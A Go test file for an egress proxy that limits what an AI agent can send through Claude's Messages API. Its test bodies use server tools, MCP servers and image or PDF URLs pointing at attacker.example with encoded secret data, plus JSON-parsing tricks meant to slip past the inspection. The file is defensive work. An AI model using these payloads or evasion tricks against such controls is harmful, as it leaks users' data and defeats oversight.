package egress

import (
	"bytes"
	"compress/gzip"
	"io"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
)

// creMessagesRules are Claude's Messages API, inspected, as the run's rules
// have it.
func creMessagesRules() (Secrets, []Rule) {
	cred := &Credential{Secret: "claude", Header: "Authorization", Scheme: "Bearer"}
	return Secrets{Values: map[string]string{"claude": creSecret}}, []Rule{
		{Method: "POST", Host: "example.com", Path: "/v1/messages", Query: AnyQuery, Headers: []string{"Content-Type", "Content-Encoding", "Anthropic-Beta"}, Credential: cred, InspectMessages: true},
		{Method: "POST", Host: "example.com", Path: "/v1/messages/count_tokens", Query: AnyQuery, Headers: []string{"Content-Type"}, Credential: cred, InspectMessages: true},
	}
}

// creBodyCase is a Messages API body and the outcome it must reach.
type creBodyCase struct {
	name, body, want, limit string
}

// creMessages sends each body to the Messages API, and checks that a
// forwarded body is the same bytes.
func creMessages(t *testing.T, cases []creBodyCase) {
	t.Helper()
	secrets, rules := creMessagesRules()
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			creRun(t, creCase{
				req: creWith("POST", "https://example.com/v1/messages?beta=true", c.body, func(r *http.Request) {
					r.Header.Set("Content-Type", "application/json")
					r.Header.Set("Authorization", "Bearer "+testPlaceholder)
				}),
				want: c.want, limit: c.limit,
				check: func(t *testing.T, s *creSeen) {
					if c.want == creForwarded && string(s.body) != c.body {
						t.Errorf("the body was not forwarded as the same bytes: %q", s.body)
					}
				},
			}, secrets, rules...)
		})
	}
}

// creTool is a request with one tool.
func creTool(tool string) string {
	return `{"model":"claude-x","max_tokens":1,"tools":[` + tool + `],"messages":[{"role":"user","content":"hi"}]}`
}

// creContent is a request whose user message holds the given content
// blocks.
func creContent(blocks string) string {
	return `{"model":"claude-x","max_tokens":1,"messages":[{"role":"user","content":[` + blocks + `]}]}`
}

// TestCreServerTools: every server tool that makes Anthropic's servers
// fetch, run or connect to anything is refused, in every version the API
// documents; the tools Claude Code runs on the agent's side pass.
// https://platform.claude.com/docs/en/agents-and-tools/tool-use/tool-reference
func TestCreServerTools(t *testing.T) {
	var cases []creBodyCase
	for _, typ := range []string{
		"web_fetch_20250910", "web_fetch_20260209", "web_fetch_20260309", "web_fetch_20260318", "web_fetch",
		"code_execution_20250522", "code_execution_20250825", "code_execution_20260120", "code_execution_20260521",
		"bash_code_execution_20250825", "text_editor_code_execution_20250825",
	} {
		cases = append(cases, creBodyCase{"CRE-021 " + typ, creTool(`{"type":"` + typ + `","name":"x"}`), reasonTool, ""})
	}
	cases = append(cases,
		creBodyCase{"CRE-022 an MCP toolset", creTool(`{"type":"mcp_toolset","mcp_server_name":"exfil"}`), reasonTool, ""},
		creBodyCase{"CRE-022 an MCP server", `{"model":"m","mcp_servers":[{"type":"url","url":"https://attacker.example/mcp","name":"exfil","authorization_token":"x"}],"messages":[]}`, reasonTool, ""},
		creBodyCase{"CRE-022 MCP servers as an object", `{"model":"m","mcp_servers":{"type":"url","url":"https://attacker.example/mcp"},"messages":[]}`, reasonTool, ""},
		creBodyCase{"CRE-022 no MCP server", `{"model":"m","mcp_servers":[],"messages":[]}`, creForwarded, ""},
		creBodyCase{"CRE-023 a type with escapes", creTool(`{"type":"web_fetch_20250910","name":"x"}`), reasonTool, ""},
		creBodyCase{"CRE-023 a type key with escapes", creTool(`{"type":"web_fetch_20250910","name":"x"}`), reasonTool, ""},
		creBodyCase{"CRE-023 a tools key with escapes", `{"tools":[{"type":"code_execution_20250825","name":"x"}]}`, reasonTool, ""},
		creBodyCase{"CRE-023 tools repeated, one with escapes", `{"tools":[],"tools":[{"type":"web_fetch_20250910"}]}`, reasonBody, ""},
		creBodyCase{"CRE-023 tools repeated in capitals", `{"tools":[],"TOOLS":[{"type":"web_fetch_20250910"}]}`, reasonBody, ""},
		creBodyCase{"CRE-023 a type repeated in another case", creTool(`{"type":"custom","TYPE":"web_fetch_20250910"}`), reasonBody, ""},
		creBodyCase{"CRE-023 a type repeated deeper", creTool(`{"name":"x","input_schema":{"type":"object","type":"web_fetch_20250910"}}`), reasonBody, ""},
		creBodyCase{"CRE-024 tools as an object", `{"tools":{"type":"web_fetch_20250910"}}`, reasonBody, ""},
		creBodyCase{"CRE-024 a tool as a string", `{"tools":["web_fetch_20250910"]}`, reasonBody, ""},
		creBodyCase{"CRE-024 a tool type as a number", creTool(`{"type":1}`), reasonBody, ""},
		creBodyCase{"CRE-024 a tool type as an object", creTool(`{"type":{"type":"web_fetch_20250910"}}`), reasonBody, ""},
		creBodyCase{"CRE-025 a tool type in capitals", creTool(`{"type":"WEB_FETCH_20250910","name":"x"}`), creForwarded,
			"the API matches tool types exactly and rejects an unknown one, so a type the proxy does not know is no server tool"},
		creBodyCase{"CRE-025 a tool type with a leading space", creTool(`{"type":" web_fetch_20250910","name":"x"}`), creForwarded,
			"the API matches tool types exactly and rejects an unknown one, so a type the proxy does not know is no server tool"},
		creBodyCase{"CRE-025 a tools key in another case alone", `{"model":"m","Tools":[{"type":"web_fetch_20250910"}],"messages":[]}`, creForwarded,
			"the API reads its keys exactly and refuses unknown top-level fields"},
		creBodyCase{"CRE-025 a tools key with a NUL", `{"model":"m","tools\u0000":[{"type":"web_fetch_20250910"}],"messages":[]}`, creForwarded,
			"valid JSON read as the same key by Go and by any compliant parser, which the API refuses as unknown; only a parser stopping at NUL would read tools"},
		creBodyCase{"CRE-026 Claude Code's own tool", creTool(`{"name":"Bash","description":"d","input_schema":{"type":"object"}}`), creForwarded, ""},
		creBodyCase{"CRE-026 a tool type of null", creTool(`{"type":null,"name":"Bash","input_schema":{}}`), creForwarded, ""},
		creBodyCase{"CRE-026 web search", creTool(`{"type":"web_search_20250305","name":"web_search","max_uses":5}`), creForwarded,
			"web search sends queries to Anthropic's search provider, which the attacker cannot read; allowed by design for Claude Code's WebSearch"},
		creBodyCase{"CRE-026 web search limited to domains", creTool(`{"type":"web_search_20250305","name":"web_search","allowed_domains":["attacker.example"]}`), creForwarded,
			"web search reads its provider's index, never the attacker's server; a query naming the attacker's domain reaches only the provider"},
		creBodyCase{"CRE-026 tool search", creTool(`{"type":"tool_search_tool_regex_20251119","name":"tool_search_tool_regex"}`), creForwarded, ""},
		creBodyCase{"CRE-026 the advisor", creTool(`{"type":"advisor_20260301","name":"advisor"}`), creForwarded,
			"the advisor consults another model on Anthropic's side, within the user's account: no reach beyond the provider"},
	)
	for _, typ := range []string{"memory_20250818", "bash_20250124", "text_editor_20250728", "computer_20251124", "computer_toolset_20260801", "browser_toolset_20260801"} {
		cases = append(cases, creBodyCase{"CRE-027 the client tool " + typ, creTool(`{"type":"` + typ + `","name":"x"}`), creForwarded, ""})
	}
	creMessages(t, cases)
}

// TestCreWebSearchRunsCode: web search from version 20260209 on filters its
// results with code execution on Anthropic's servers unless allowed_callers
// is ["direct"], which would bring back the code execution the proxy refuses
// when it is asked for by name.
// https://platform.claude.com/docs/en/agents-and-tools/tool-use/web-search-tool
func TestCreWebSearchRunsCode(t *testing.T) {
	creMessages(t, []creBodyCase{
		{"CRE-028 web search 20260209 by default", creTool(`{"type":"web_search_20260209","name":"web_search"}`), reasonTool, ""},
		{"CRE-028 web search 20260318 by default", creTool(`{"type":"web_search_20260318","name":"web_search"}`), reasonTool, ""},
		{"CRE-028 web search called from code execution", creTool(`{"type":"web_search_20260209","name":"web_search","allowed_callers":["code_execution_20260120"]}`), reasonTool, ""},
		{"CRE-028 web search 20260209 called directly", creTool(`{"type":"web_search_20260209","name":"web_search","allowed_callers":["direct"]}`), creForwarded, ""},
	})
}

// TestCreURLSources: an image or a PDF whose source is a URL makes
// Anthropic's servers fetch that URL, which the proxy never sees: the URL
// can carry the user's data to the attacker's server, through the user's
// own account. Tool results can hold them too: refused anywhere.
// https://platform.claude.com/docs/en/build-with-claude/vision
// https://platform.claude.com/docs/en/build-with-claude/pdf-support
func TestCreURLSources(t *testing.T) {
	const leak = "https://attacker.example/c.png?d=c2VjcmV0LWNvZGU"
	creMessages(t, []creBodyCase{
		{"CRE-029 an image by URL", creContent(`{"type":"image","source":{"type":"url","url":"` + leak + `"}}`), reasonTool, ""},
		{"CRE-029 a PDF by URL", creContent(`{"type":"document","source":{"type":"url","url":"https://attacker.example/d.pdf?d=c2VjcmV0"}}`), reasonTool, ""},
		{"CRE-029 an image by URL in a tool result", creContent(`{"type":"tool_result","tool_use_id":"toolu_1","content":[{"type":"image","source":{"type":"url","url":"` + leak + `"}}]}`), reasonTool, ""},
		{"CRE-029 a PDF by URL in a tool result", creContent(`{"type":"tool_result","tool_use_id":"toolu_1","content":[{"type":"document","source":{"type":"url","url":"https://attacker.example/d.pdf"}}]}`), reasonTool, ""},
		{"CRE-029 a URL source type with escapes", creContent(`{"type":"image","source":{"type":"url","url":"` + leak + `"}}`), reasonTool, ""},
		{"CRE-029 an image by URL in an earlier turn", `{"model":"m","max_tokens":1,"messages":[{"role":"user","content":[{"type":"image","source":{"type":"url","url":"` + leak + `"}}]},{"role":"assistant","content":"ok"},{"role":"user","content":"go on"}]}`, reasonTool, ""},
		{"CRE-030 an image in base64", creContent(`{"type":"image","source":{"type":"base64","media_type":"image/png","data":"iVBORw0KGgo="}}`), creForwarded, ""},
		{"CRE-030 a text document", creContent(`{"type":"document","source":{"type":"text","media_type":"text/plain","data":"https://attacker.example/not-fetched"}}`), creForwarded, ""},
		{"CRE-030 a text block naming a URL", creContent(`{"type":"text","text":"see https://attacker.example/x"}`), creForwarded, ""},
		{"CRE-031 an image from the Files API", creContent(`{"type":"image","source":{"type":"file","file_id":"file_011CNha8iCJcU1wXNR6q4V8w"}}`), creForwarded,
			"a file ID reads a file of the user's own workspace into the model; the Files API itself is refused, so the agent can neither add nor fetch one"},
		{"CRE-031 a container upload", creContent(`{"type":"container_upload","file_id":"file_011CNha8iCJcU1wXNR6q4V8w"}`), creForwarded,
			"it only feeds code execution, which is refused"},
		{"CRE-031 skills without code execution", `{"model":"m","max_tokens":1,"container":{"skills":[{"type":"custom","skill_id":"skill_01attacker","version":"latest"}]},"messages":[]}`, creForwarded,
			"skills run only with the code execution tool, which is refused, and custom skills come from the Skills API, which is refused"},
		{"CRE-031 a server tool call in the history", `{"model":"m","max_tokens":1,"messages":[{"role":"user","content":"hi"},{"role":"assistant","content":[{"type":"server_tool_use","id":"srvtoolu_1","name":"web_fetch","input":{"url":"` + leak + `"}}]}]}`, creForwarded,
			"a server tool runs only when the request declares it, and its declaration is refused"},
	})
}

// TestCreJSONDifferentials: a body the proxy and the API could read
// differently is refused; one only the API refuses is harmless.
func TestCreJSONDifferentials(t *testing.T) {
	webFetch := `{"type":"web_fetch_20250910","name":"x"}`
	cases := []creBodyCase{
		{"CRE-032 a byte order mark", "\xef\xbb\xbf" + creTool(webFetch), reasonBody, ""},
		{"CRE-032 a line comment", "// x\n" + creTool(webFetch), reasonBody, ""},
		{"CRE-032 a block comment", `{"model":"m",/* "tools":[] */"tools":[` + webFetch + `]}`, reasonBody, ""},
		{"CRE-032 a trailing comma in an object", `{"model":"m","tools":[` + webFetch + `],}`, reasonBody, ""},
		{"CRE-032 a trailing comma in an array", `{"model":"m","tools":[` + webFetch + `,]}`, reasonBody, ""},
		{"CRE-032 NaN", `{"model":"m","temperature":NaN}`, reasonBody, ""},
		{"CRE-032 Infinity", `{"model":"m","temperature":Infinity}`, reasonBody, ""},
		{"CRE-032 a single-quoted string", `{'tools':[` + webFetch + `]}`, reasonBody, ""},
		{"CRE-032 an unquoted key", `{tools:[` + webFetch + `]}`, reasonBody, ""},
		{"CRE-032 a raw NUL", "{\"model\":\"m\x00\"}", reasonBody, ""},
		{"CRE-032 a raw newline in a string", "{\"model\":\"m\n\"}", reasonBody, ""},
		{"CRE-032 a number too large for a double", `{"model":"m","max_tokens":1e400}`, reasonBody, ""},
		{"CRE-032 a huge integer", `{"model":"m","max_tokens":` + strings.Repeat("9", 400) + `}`, reasonBody, ""},
		{"CRE-033 trailing garbage", `{"model":"m"}x`, reasonBody, ""},
		{"CRE-033 a second value", `{"model":"m"}` + creTool(webFetch), reasonBody, ""},
		{"CRE-033 a top-level array", `[` + creTool(webFetch) + `]`, reasonBody, ""},
		{"CRE-033 a top-level string", `"web_fetch_20250910"`, reasonBody, ""},
		{"CRE-033 a top-level number", `1`, reasonBody, ""},
		{"CRE-033 a top-level null", `null`, reasonBody, ""},
		{"CRE-033 trailing whitespace", creTool(`{"name":"Bash","input_schema":{}}`) + "\r\n", creForwarded, ""},
		{"CRE-034 nesting within the limit", `{"metadata":` + strings.Repeat("[", 120) + strings.Repeat("]", 120) + `}`, creForwarded, ""},
		{"CRE-034 nesting past the limit", `{"metadata":` + strings.Repeat("[", 200) + strings.Repeat("]", 200) + `}`, reasonBody, ""},
		{"CRE-034 deep nesting of objects", strings.Repeat(`{"a":`, 300) + "1" + strings.Repeat("}", 300), reasonBody, ""},
		{"CRE-035 a key repeated with escapes in a content block", creContent(`{"type":"text","type":"image","text":"x"}`), reasonBody, ""},
		{"CRE-035 a key repeated with a long s", `{"model":"m","tools":[],"toolſ":[]}`, creForwarded,
			"Go and the API read two different keys; neither folds the long s, and the API refuses the unknown one"},
	}
	creMessages(t, cases)
}

// TestCreInvalidUTF8: Go's decoder reads invalid UTF-8 as U+FFFD, while the
// proxy forwards the raw bytes: the proxy would decide on one reading of the
// body and the API get another, so a body that is not UTF-8 is refused.
func TestCreInvalidUTF8(t *testing.T) {
	creMessages(t, []creBodyCase{
		{"CRE-036 invalid UTF-8 in a key", "{\"model\":\"m\",\"too\xffls\":[{\"type\":\"web_fetch_20250910\"}]}", reasonBody, ""},
		{"CRE-036 invalid UTF-8 in a tool type", creTool("{\"type\":\"\xffweb_fetch_20250910\"}"), reasonBody, ""},
		{"CRE-036 an overlong encoding in a source type", creContent("{\"type\":\"image\",\"source\":{\"type\":\"\xc1\xb5rl\",\"url\":\"https://attacker.example/\"}}"), reasonBody, ""},
	})
}

// TestCreMessagesFraming: the inspection holds whatever the framing of the
// body, and a body the proxy cannot read is refused.
func TestCreMessagesFraming(t *testing.T) {
	secrets, rules := creMessagesRules()
	webFetch := creTool(`{"type":"web_fetch_20250910","name":"x"}`)
	var gz bytes.Buffer
	zw := gzip.NewWriter(&gz)
	io.WriteString(zw, webFetch)
	zw.Close()
	for _, c := range []creCase{
		{name: "CRE-037 a chunked body", req: func(t *testing.T) *http.Request {
			return creRaw(t, "example.com", "POST /v1/messages HTTP/1.1\r\nHost: example.com\r\nTransfer-Encoding: chunked\r\n\r\n"+
				creChunk(webFetch[:20])+creChunk(webFetch[20:])+"0\r\n\r\n")
		}, want: reasonTool},
		{name: "CRE-037 a gzip body", req: creWith("POST", "https://example.com/v1/messages", gz.String(), creHeader("Content-Encoding", "gzip")), want: reasonBody},
		{name: "CRE-037 count_tokens", req: creWith("POST", "https://example.com/v1/messages/count_tokens", webFetch, nil), want: reasonTool},
		{name: "CRE-037 count_tokens with a URL image", req: creWith("POST", "https://example.com/v1/messages/count_tokens", creContent(`{"type":"image","source":{"type":"url","url":"https://attacker.example/x"}}`), nil),
			want: reasonTool},
		{name: "CRE-037 a body past the limit, chunked", req: func(t *testing.T) *http.Request {
			r := agentRequest("POST", "https://example.com/v1/messages", nil)
			r.Body = io.NopCloser(io.MultiReader(strings.NewReader(`{"model":"`), creZeros(MaxBodyBytes)))
			r.ContentLength = -1
			r.TransferEncoding = []string{"chunked"}
			return r
		}, want: reasonTooLarge},
		{name: "CRE-037 a Content-Length past the limit", req: func(t *testing.T) *http.Request {
			r := agentRequest("POST", "https://example.com/v1/messages", strings.NewReader("{}"))
			r.ContentLength = MaxBodyBytes + 1
			return r
		}, want: reasonTooLarge},
	} {
		t.Run(c.name, func(t *testing.T) { creRun(t, c, secrets, rules...) })
	}
}

// TestCreMessagesNoBody: a request with no body has nothing to inspect, and
// nothing reaches the upstream but the proxy's own request.
func TestCreMessagesNoBody(t *testing.T) {
	secrets, rules := creMessagesRules()
	p, seen := creProxy(t, secrets, rules...)
	r := agentRequest("POST", "https://example.com/v1/messages", nil)
	w := httptest.NewRecorder()
	p.ServeHTTP(w, r)
	creVerdict(t, w, seen, creForwarded)
	if len(seen.body) != 0 {
		t.Errorf("the upstream received a body: %q", seen.body)
	}
}

func creChunk(s string) string {
	return strings.ToUpper(strings.TrimLeft(hexByte(byte(len(s))), "0")) + "\r\n" + s + "\r\n"
}

// creZeros is n bytes of "0", without holding them.
func creZeros(n int64) io.Reader {
	return io.LimitReader(creRepeat('0'), n)
}

type creRepeat byte

func (b creRepeat) Read(p []byte) (int, error) {
	for i := range p {
		p[i] = byte(b)
	}
	return len(p), nil
}
